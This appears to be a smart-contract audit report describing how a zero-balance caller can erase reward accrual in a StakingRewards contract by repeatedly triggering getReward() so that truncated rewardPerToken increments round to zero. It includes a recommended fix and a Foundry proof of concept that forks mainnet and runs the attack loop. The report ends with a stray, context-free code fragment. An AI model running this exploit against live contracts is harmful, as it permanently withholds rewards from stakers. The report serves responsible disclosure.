### Title
Unprivileged users can permanently erase reward accrual by repeatedly checkpointing sub-unit `rewardPerToken` intervals - ([File: `contracts/StakingRewards.sol`])

### Summary
`StakingRewards` lets any caller execute `getReward()` with a zero staking balance. The function always runs `updateReward(msg.sender)`, which stores the current `rewardPerToken()` result and advances the global `lastUpdateTime` even when integer division made that result unchanged. If `elapsed * rewardRate * 1e18 < totalSupply`, the accrued rewards for that elapsed interval are permanently discarded. An attacker can repeat the call sufficiently often to erase an entire low-decimal reward period for all stakers. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
The global reward checkpoint is updated by every public stake, withdraw, and claim path. `rewardPerToken()` computes the increment as:

```solidity
elapsed * rewardRate * 1e18 / _totalSupply
```

When the numerator is smaller than `_totalSupply`, Solidity truncates the increment to zero. Nevertheless, `updateReward` still writes `lastUpdateTime = lastTimeRewardApplicable()`. Because `getReward()` is unrestricted and does not require a positive caller balance, any EOA can advance the global checkpoint without staking. [4](#0-3) [3](#0-2) 

For example, with `1_000_000e18` staking tokens and `100e6` USDC distributed over one day:

- `rewardRate = 100e6 / 86400 = 1157`
- Truncation condition: `elapsed * 1157e18 < 1_000_000e18`
- Maximum harmful interval: approximately `864` seconds

Calling `getReward()` every `800` seconds prevents every interval from producing a nonzero `rewardPerToken` increment. At `periodFinish`, the victim has accrued zero rewards even though the full `100 USDC` remains in the contract. [5](#0-4) 

### Impact Explanation
This is a denial of reward accrual affecting every staker, including users who never interact during the attack. The attacker does not need stake, KYC, or a privileged role. In the example above, `100 USDC` of rewards is permanently withheld from the legitimate staker and remains recoverable only through trusted owner intervention via `recoverERC20`. [2](#0-1) [6](#0-5) 

### Likelihood Explanation
The attack is practical whenever the staking supply is large relative to a low-decimal reward token's emission rate. The condition is deterministic and depends only on timestamp spacing; the caller can use a zero-balance `getReward()` call. No existing guard prevents the global `lastUpdateTime` from advancing after a truncated zero increment. [7](#0-6) [3](#0-2) 

### Recommendation
Avoid advancing `lastUpdateTime` when the computed `rewardPerToken` did not increase, or accumulate elapsed time separately until enough reward has accrued to cross the divisibility threshold. Alternatively, scale `rewardRate` by a higher precision factor at reward deposit time so low-decimal tokens cannot be truncated by ordinary update spacing. If arbitrary-account checkpointing is added later, it should use the same protection.

### Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {StakingRewards} from "../contracts/StakingRewards.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RewardCheckpointTruncationPoC is Test {
    address constant IDLE = 0x875773784Af8135eA0ef43b5a374AaD105c5D39e;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    StakingRewards rewards;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address distributor = makeAddr("distributor");

    function setUp() public {
        vm.createSelectFork("mainnet");

        rewards = new StakingRewards();
        rewards.initialize(distributor, USDC, IDLE, address(this), true);

        deal(IDLE, victim, 1_000_000e18);
        deal(USDC, distributor, 100e6);

        vm.startPrank(victim);
        IERC20(IDLE).approve(address(rewards), type(uint256).max);
        rewards.stake(1_000_000e18);
        vm.stopPrank();

        vm.startPrank(distributor);
        IERC20(USDC).approve(address(rewards), type(uint256).max);
        rewards.depositReward(address(0), 100e6);
        vm.stopPrank();
    }

    function test_zeroBalanceCallerErasesRewardAccrual() public {
        uint256 finish = rewards.periodFinish();
        uint256 interval = 800;

        // Threshold:
        // interval * rewardRate * 1e18 < totalSupply
        // 800 * 1157e18 < 1_000_000e18
        while (block.timestamp < finish) {
            vm.warp(block.timestamp + interval > finish ? finish : block.timestamp + interval);
            vm.prank(attacker);
            rewards.getReward();
        }

        assertEq(rewards.earned(victim), 0);
        assertEq(rewards.rewardPerTokenStored(), 0);
        assertEq(rewards.lastUpdateTime(), finish);
        assertEq(IERC20(USDC).balanceOf(address(rewards)), 100e6);
    }
}
```

    } else {
      uint256 remaining = periodFinish - block.timestamp;
      uint256 leftover = remaining * rewardRate;
      rewardRate = (reward + leftover) / rewardsDuration;
